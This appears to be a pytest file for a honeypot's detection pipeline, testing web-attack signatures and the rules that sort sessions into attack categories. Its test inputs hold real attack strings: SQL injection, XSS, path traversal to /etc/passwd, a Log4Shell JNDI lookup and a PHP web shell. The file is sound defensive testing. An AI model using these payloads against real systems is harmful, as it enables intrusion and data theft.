"""The rule-based category reconciliation and the web-attack NLP signatures.

The flow classifier is domain-shifted onto command/web sessions and calls them
benign; these cover the rule layer that fixes that.
"""

from app.ai.nlp_engine import nlp_engine
from app.models import AttackCategory
from app.services.analysis import AnalysisPipeline

pipeline = AnalysisPipeline()


def cat(nlp=None, **session):
    nlp = nlp or {"categories": [], "detected_intents": []}
    return pipeline._rule_based_category(nlp, session)[0]


class TestWebAttackSignatures:
    def _cats(self, *commands):
        return set(nlp_engine.analyze_commands(list(commands))["categories"])

    def test_sql_injection_in_request(self):
        assert "sql_injection" in self._cats("GET /api/products?q=1' UNION SELECT password FROM users--")

    def test_xss(self):
        assert "xss" in self._cats("GET /shop?q=<script>alert(1)</script>")

    def test_path_traversal(self):
        assert "path_traversal" in self._cats("GET /?file=../../../../etc/passwd")

    def test_log4shell(self):
        assert "log4shell" in self._cats("GET / [ua: ${jndi:ldap://x/a}]")

    def test_webshell_body(self):
        assert "webshell" in self._cats("POST /upload\n<?php system($_GET[0]); ?>")

    def test_plain_browsing_is_clean(self):
        cats = self._cats("GET /", "GET /api/products?limit=2", "GET /shop")
        assert not ({"sql_injection", "xss", "log4shell", "webshell"} & cats)


class TestRuleCategory:
    def test_benign_when_nothing_matches(self):
        assert cat() is AttackCategory.BENIGN

    def test_scanner_is_reconnaissance(self):
        assert cat({"categories": ["scanner"], "detected_intents": []}) is AttackCategory.RECONNAISSANCE

    def test_sql_injection_is_exploitation(self):
        assert cat({"categories": ["sql_injection"], "detected_intents": []}) is AttackCategory.EXPLOITATION

    def test_brute_force_is_exploitation(self):
        assert cat(failed_logins=8) is AttackCategory.EXPLOITATION

    def test_two_failed_logins_is_not_brute_force(self):
        assert cat(failed_logins=2) is AttackCategory.BENIGN

    def test_upload_is_exploitation(self):
        assert cat(uploads=[{"filename": "shell.php"}]) is AttackCategory.EXPLOITATION

    def test_exfiltration_wins_over_recon(self):
        assert cat({"categories": ["scanner", "exfiltration"], "detected_intents": []}) is AttackCategory.EXFILTRATION

    def test_flagged_probe_is_at_least_recon(self):
        assert cat(packets=[{"type": "attack_detected", "size": 10}]) is AttackCategory.RECONNAISSANCE

    def test_confidence_rises_with_corroboration(self):
        _, one, _ = pipeline._rule_based_category({"categories": ["sql_injection"], "detected_intents": []}, {})
        _, many, _ = pipeline._rule_based_category(
            {"categories": ["sql_injection"], "detected_intents": []},
            {"failed_logins": 9, "uploads": [{"filename": "x"}]},
        )
        assert many > one

    def test_diverted_session_is_at_least_recon_and_says_why(self):
        category, _, reason = pipeline._rule_based_category(
            {"categories": [], "detected_intents": []},
            {"events": [{"event_type": "http_diversion", "reason": "requested bait path /.env", "path": "/.env"}]},
        )
        assert category is AttackCategory.RECONNAISSANCE
        assert "diverted to the decoy application (requested bait path /.env)" in reason

    def test_retrieval_events_alone_do_not_count_as_diversion(self):
        assert cat(events=[{"event_type": "file_download", "url": "http://x/a"}]) is AttackCategory.BENIGN
